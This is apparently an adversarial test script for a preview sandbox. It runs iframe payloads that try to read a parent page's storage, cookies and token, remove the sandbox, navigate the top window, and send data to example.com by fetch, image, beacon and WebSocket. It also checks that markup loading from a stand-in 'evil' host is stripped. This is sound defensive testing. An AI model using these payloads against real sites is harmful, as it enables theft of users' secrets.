// Adversarial test of the preview sandbox. Each payload is a prototype that
// tries to do something it must not be able to do.
import { createRequire } from "node:module";
const require = createRequire(import.meta.url);
import pw from "/opt/node22/lib/node_modules/playwright/index.js";
const { chromium } = pw;

const browser = await chromium.launch();
const ctx = await browser.newContext();
const page = await ctx.newPage();

// Serve the real app so the frame has a genuine parent with real secrets.
await page.goto("http://localhost:8080/", { waitUntil: "networkidle" });
await page.evaluate(() => {
  localStorage.setItem("high-thoughts/v1", JSON.stringify([{ id: "x", thought: "MY-SECRET-IDEA" }]));
  localStorage.setItem("high-thoughts/token/v1", "ht_SECRETTOKEN");
  document.cookie = "sessionish=COOKIE-SECRET";
});

const payload = (body) => `<!doctype html><html><head><title>atk</title></head><body>
<script>
  const say = (k, v) => { try { parent.postMessage({ atk: k, v: String(v) }, '*'); } catch (e) {} };
  ${body}
<\/script></body></html>`;

const ATTACKS = {
  readParentStorage: `try { say('r', parent.localStorage.getItem('high-thoughts/v1')); } catch (e) { say('r', 'BLOCKED:' + e.name); }`,
  readParentCookie:  `try { say('r', parent.document.cookie); } catch (e) { say('r', 'BLOCKED:' + e.name); }`,
  readOwnStorage:    `try { localStorage.setItem('a','b'); say('r', 'WROTE:' + localStorage.getItem('a')); } catch (e) { say('r', 'BLOCKED:' + e.name); }`,
  stripOwnSandbox:   `try { const f = parent.document.querySelector('iframe'); f.removeAttribute('sandbox'); say('r', 'REMOVED-SANDBOX'); } catch (e) { say('r', 'BLOCKED:' + e.name); }`,
  exfiltrateFetch:   `fetch('https://example.com/?x=1').then(() => say('r','FETCH-OK')).catch(e => say('r','BLOCKED:' + e.name));`,
  exfiltrateImage:   `const i = new Image(); i.onload = () => say('r','IMG-OK'); i.onerror = () => say('r','BLOCKED:img'); i.src = 'https://example.com/p.gif?d=1';`,
  exfiltrateBeacon:  `try { say('r', navigator.sendBeacon('https://example.com/b','x') ? 'BEACON-OK' : 'BLOCKED:refused'); } catch (e) { say('r','BLOCKED:' + e.name); }`,
  websocket:         `try { new WebSocket('wss://example.com'); say('r','WS-OK'); } catch (e) { say('r','BLOCKED:' + e.name); }`,
  navigateTop:       `try { top.location = 'https://example.com'; say('r','NAV-OK'); } catch (e) { say('r','BLOCKED:' + e.name); }`,
  openPopup:         `try { say('r', window.open('https://example.com') ? 'POPUP-OK' : 'BLOCKED:null'); } catch (e) { say('r','BLOCKED:' + e.name); }`,
  readParentOrigin:  `try { say('r', parent.location.href); } catch (e) { say('r', 'BLOCKED:' + e.name); }`,
  callParentFn:      `try { say('r', typeof parent.fetch === 'function' ? 'REACHED-PARENT' : 'no'); } catch (e) { say('r','BLOCKED:' + e.name); }`,
};

const results = {};
for (const [name, body] of Object.entries(ATTACKS)) {
  const got = await page.evaluate(async ({ html }) => {
    const { mountPreview } = await import("/preview.js");
    const host = document.createElement("div");
    document.body.append(host);
    return await new Promise((resolve) => {
      const done = (v) => { window.removeEventListener("message", onMsg); handle.stop(); host.remove(); resolve(v); };
      const onMsg = (e) => { if (e.data && e.data.atk) done(e.data.v); };
      window.addEventListener("message", onMsg);
      const handle = mountPreview(host, html);
      setTimeout(() => done("(no answer — blocked silently)"), 4000);
    });
  }, { html: payload(body) });
  results[name] = got;
}

// Did anything actually leave the page?
const leaked = await page.evaluate(() => ({
  storageIntact: localStorage.getItem("high-thoughts/v1"),
  sandboxStillSet: [...document.querySelectorAll("iframe")].every((f) => f.getAttribute("sandbox") === "allow-scripts"),
  url: location.href,
}));

// External resource stripping
const strip = await page.evaluate(async () => {
  const { sanitizePrototype } = await import("/preview.js");
  const r = sanitizePrototype(`<html><head><link rel=stylesheet href=https://evil/x.css><base href=https://evil/></head>
<body><script src="https://evil/x.js"><\/script><iframe src=https://evil></iframe>
<meta http-equiv="refresh" content="0;url=https://evil"><meta http-equiv="Content-Security-Policy" content="default-src *"></body></html>`);
  return { removedCount: r.removed.length, hasEvil: /evil/.test(r.html), hasOurCsp: /connect-src 'none'/.test(r.html) };
});

console.log(JSON.stringify({ attacks: results, parentState: leaked, stripping: strip }, null, 2));
await browser.close();
